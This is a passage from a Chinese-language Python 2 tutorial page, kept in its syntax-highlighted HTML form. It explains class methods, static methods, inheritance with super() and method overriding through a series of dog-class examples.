实例化类</span>d1 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'大黄'</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>d2 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'二黑'</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 调用类方法输出当前狗的数量</span><span class="token keyword">print</span> <span class="token string">'当前狗的数量为：{}只'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>Dog<span class="token punctuation">.</span>number_of_dogs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 调用类方法返回最高大的狗</span><span class="token keyword">print</span> <span class="token string">'当前狗狗最高身高为：{}公分'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>Dog<span class="token punctuation">.</span>biggest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>练习：</p><pre class="line-numbers language-python"><code class="language-python">构造一个类方法，要求返回height大于<span class="token number">50</span>的狗的数量<span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    dogs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    big_dogs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true"># 构造一个类方法，要求返回height大于50的狗的数量</span>    @classmethod    <span class="token keyword">def</span> <span class="token function">num_of_big_dog</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> Dog<span class="token punctuation">.</span>dogs<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token punctuation">.</span>height <span class="token operator">></span> <span class="token number">50</span><span class="token punctuation">:</span>                Dog<span class="token punctuation">.</span>big_dogs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">'身高大于50公分的狗有{}只'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>len<span class="token punctuation">(</span>Dog<span class="token punctuation">.</span>big_dogs<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 构造方法 - 添加实例属性，做其他初始化工作</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>height<span class="token punctuation">,</span>power<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>height <span class="token operator">=</span> height        self<span class="token punctuation">.</span>blood <span class="token operator">=</span> <span class="token number">10</span>        self<span class="token punctuation">.</span>power <span class="token operator">=</span> power        <span class="token keyword">print</span> <span class="token string">'{}出生了！汪汪~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span>        Dog<span class="token punctuation">.</span>dogs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 实例化多个对象</span>d1 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'大黄'</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>d2 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'二黑'</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">)</span>d3 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'三傻'</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span>d4 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'四喜'</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">)</span>d5 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">'五白'</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 调用类方法输出height大于50的狗的数量</span>Dog<span class="token punctuation">.</span>num_of_big_dog<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h3><p>之前我们学习了两个方法：<strong>实例方法</strong>与<strong>类方法</strong>，实例方法的第一个参数是实例，只能调用实例属性，调用类属性则会创建一个与类属性同名的实例属性；类方法的第一个参数是类，只能调用类属性。</p><p>如果有一个方法它属于这个类，它既不需要使用实例属性，也不需要使用类属性，那么这个方法就是<strong>静态方法</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 定义静态方法</span>    @staticmethod    <span class="token keyword">def</span> <span class="token function">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Dog is human's best friend~"</span><span class="token comment" spellcheck="true"># 实例化一个对象</span>d1 <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 调用静态方法</span>Dog<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span>d1<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="继承和super"><a href="#继承和super" class="headerlink" title="继承和super()"></a>继承和super()</h3><p>现在我们手上有3只狗，分别是警犬、牧羊犬、宠物犬，它们有各自的特性，但也有共同的属性，这时候就要用到类的继承了。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201026222708401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>具体代码可以这样实现：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 定义构造方法</span><span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>height <span class="token operator">=</span> height        self<span class="token punctuation">.</span>power <span class="token operator">=</span> power        self<span class="token punctuation">.</span>blood <span class="token operator">=</span> <span class="token number">10</span>    <span class="token comment" spellcheck="true"># 构造bark方法</span>    <span class="token keyword">def</span> <span class="token function">bark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我是{}，汪汪~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义一个SheepDog类，它是Dog的子类，继承Dog的构造方法</span><span class="token keyword">class</span> <span class="token class-name">SheepDog</span><span class="token punctuation">(</span>Dog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 定义构造方法，这里添加了一个特性num_of_sheeps</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">,</span>num_of_sheeps<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 用super()初始化构造父类，这里的super()函数与python3中有所不同！</span>        super<span class="token punctuation">(</span>SheepDog<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 设置方法属性</span>        self<span class="token punctuation">.</span>num_of_sheeps <span class="token operator">=</span> num_of_sheeps<span class="token comment" spellcheck="true"># 实例化一个对象</span>sd <span class="token operator">=</span> SheepDog<span class="token punctuation">(</span><span class="token string">'牧羊犬'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 调用父类方法</span>sd<span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在我们做一个练习，把其余的两只狗也定义出来，只定义属性，先不定义它们的方法：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 定义构造方法</span><span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>height <span class="token operator">=</span> height        self<span class="token punctuation">.</span>power <span class="token operator">=</span> power        self<span class="token punctuation">.</span>blood <span class="token operator">=</span> <span class="token number">10</span>    <span class="token comment" spellcheck="true"># 构造bark方法</span>    <span class="token keyword">def</span> <span class="token function">bark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我是{}，汪汪~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义牧羊犬</span><span class="token keyword">class</span> <span class="token class-name">SheepDog</span><span class="token punctuation">(</span>Dog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 定义构造方法，这里添加了一个特性num_of_sheeps</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">,</span>num_of_sheeps<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 用super()初始化构造父类，这里的super()函数与python3中有所不同！</span>        super<span class="token punctuation">(</span>SheepDog<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 设置方法属性</span>        self<span class="token punctuation">.</span>num_of_sheeps <span class="token operator">=</span> num_of_sheeps<span class="token comment" spellcheck="true"># 定义警犬</span><span class="token keyword">class</span> <span class="token class-name">PoliceDog</span><span class="token punctuation">(</span>Dog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">,</span>ability<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span>PoliceDog<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>ability <span class="token operator">=</span> ability<span class="token comment" spellcheck="true"># 定义宠物犬</span><span class="token keyword">class</span> <span class="token class-name">PetDog</span><span class="token punctuation">(</span>Dog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">,</span>price<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span>PetDog<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>price <span class="token operator">=</span> price<span class="token comment" spellcheck="true"># 牧羊犬</span>sd <span class="token operator">=</span> SheepDog<span class="token punctuation">(</span><span class="token string">'牧羊犬'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">print</span> sd<span class="token punctuation">.</span>bloodsd<span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 警犬</span>pd <span class="token operator">=</span> PoliceDog<span class="token punctuation">(</span><span class="token string">'警犬'</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token keyword">print</span> pd<span class="token punctuation">.</span>bloodpd<span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 宠物犬</span>petd <span class="token operator">=</span> PetDog<span class="token punctuation">(</span><span class="token string">'宠物犬'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">print</span> petd<span class="token punctuation">.</span>bloodpetd<span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="给子类添加方法"><a href="#给子类添加方法" class="headerlink" title="给子类添加方法"></a>给子类添加方法</h3><p>我峨嵋你继承父类以后，可以使用它的构造方法以及它的类属性，但子类也会有自己的方法，就像上文中的三只狗，它们有一个自己的方法，这时候我们就需要给子类定义方法了。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201026222708401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>添加方法的方式其实也很简单，就是在子类中定义一个新的方法罢了：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 定义构造方法</span><span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>height <span class="token operator">=</span> height        self<span class="token punctuation">.</span>power <span class="token operator">=</span> power        self<span class="token punctuation">.</span>blood <span class="token operator">=</span> <span class="token number">10</span>    <span class="token comment" spellcheck="true"># 构造bark方法</span>    <span class="token keyword">def</span> <span class="token function">bark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我是{}，汪汪~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义一个SheepDog类，它是Dog的子类，继承Dog的构造方法</span><span class="token keyword">class</span> <span class="token class-name">SheepDog</span><span class="token punctuation">(</span>Dog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 定义构造方法，这里添加了一个特性num_of_sheeps</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">,</span>num_of_sheeps<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 用super()初始化构造父类，这里的super()函数与python3中有所不同！</span>        super<span class="token punctuation">(</span>SheepDog<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 设置方法属性</span>        self<span class="token punctuation">.</span>num_of_sheeps <span class="token operator">=</span> num_of_sheeps    <span class="token keyword">def</span> <span class="token function">protect</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我开始保护羊群了，汪汪！'</span><span class="token comment" spellcheck="true"># 定义警犬</span><span class="token keyword">class</span> <span class="token class-name">PoliceDog</span><span class="token punctuation">(</span>Dog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">,</span>ability<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span>PoliceDog<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>ability <span class="token operator">=</span> ability    <span class="token keyword">def</span> <span class="token function">detect</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我开始侦擦了，汪汪！'</span><span class="token comment" spellcheck="true"># 定义宠物犬</span><span class="token keyword">class</span> <span class="token class-name">PetDog</span><span class="token punctuation">(</span>Dog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">,</span>price<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span>PetDog<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>price <span class="token operator">=</span> price    <span class="token keyword">def</span> <span class="token function">sing</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我开始唱歌了，汪汪！'</span><span class="token comment" spellcheck="true"># 牧羊犬</span>sd <span class="token operator">=</span> SheepDog<span class="token punctuation">(</span><span class="token string">'牧羊犬'</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">70</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span>sd<span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 调用牧羊犬子方法</span>sd<span class="token punctuation">.</span>protect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 警犬</span>pd <span class="token operator">=</span> PoliceDog<span class="token punctuation">(</span><span class="token string">'警犬'</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span>pd<span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 调用警犬子方法</span>pd<span class="token punctuation">.</span>detect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 宠物犬</span>petd <span class="token operator">=</span> PetDog<span class="token punctuation">(</span><span class="token string">'宠物犬'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>petd<span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 调用宠物犬子方法</span>petd<span class="token punctuation">.</span>sing<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="重写父类方法"><a href="#重写父类方法" class="headerlink" title="重写父类方法"></a>重写父类方法</h3><p>重写的格式就是在子类中定义一个与父类方法同名的子方法即可：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 定义构造方法</span><span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>height <span class="token operator">=</span> height        self<span class="token punctuation">.</span>power <span class="token operator">=</span> power        self<span class="token punctuation">.</span>blood <span class="token operator">=</span> <span class="token number">10</span>    <span class="token comment" spellcheck="true"># 构造bark方法</span>    <span class="token keyword">def</span> <span class="token function">bark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我是{}，汪汪~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义一个SheepDog类，它是Dog的子类，继承Dog的构造方法</span><span class="token keyword">class</span> <span class="token class-name">SheepDog</span><span class="token punctuation">(</span>Dog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># 定义构造方法，这里添加了一个特性num_of_sheeps</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">,</span>num_of_sheeps<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 用super()初始化构造父类，这里的super()函数与python3中有所不同！</span>        super<span class="token punctuation">(</span>SheepDog<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># 设置方法属性</span>        self<span class="token punctuation">.</span>num_of_sheeps <span class="token operator">=</span> num_of_sheeps    <span class="token keyword">def</span> <span class="token function">protect</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我开始保护羊群了，汪汪！'</span><span class="token comment" spellcheck="true"># 定义警犬</span><span class="token keyword">class</span> <span class="token class-name">PoliceDog</span><span class="token punctuation">(</span>Dog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">,</span>ability<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span>PoliceDog<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>ability <span class="token operator">=</span> ability    <span class="token keyword">def</span> <span class="token function">detect</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我开始侦擦了，汪汪！'</span>    <span class="token keyword">def</span> <span class="token function">bark</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我是{}，这是我自己的方法，我重写了父类方法~'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 定义宠物犬</span><span class="token keyword">class</span> <span class="token class-name">PetDog</span><span class="token punctuation">(</span>Dog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">,</span>price<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span>PetDog<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>price <span class="token operator">=</span> price    <span class="token keyword">def</span> <span class="token function">sing</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">'我开始唱歌了，汪汪！'</span><span class="token comment" spellcheck="true"># 警犬</span>pd <span class="token operator">=</span> PoliceDog<span class="token punctuation">(</span><span class="token string">'警犬'</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 重写父类方法</span>pd<span class="token punctuation">.</span>bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 调用警犬子方法</span>pd<span class="token punctuation">.</span>detect<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果你想既重写了父类方法，又要调用原父类方法的话，我们可以用super()来实现这个功能</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 定义构造方法</span><span class="token keyword">class</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>power<span class="token punctuation">,</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>height <span class="token operator">=</span> height        self<span class="token punctuation">.</span>power <span class="token operator">=</span> power        self<span class="token punctuation">.</span>blood <span class="token operator">=</span> <span class="token number">10</span>    <span class="token comment" spellcheck="true"># 构造bark方法</span>    <span class="token keyword">def</span> <span class="token function">bark</span><span class="token 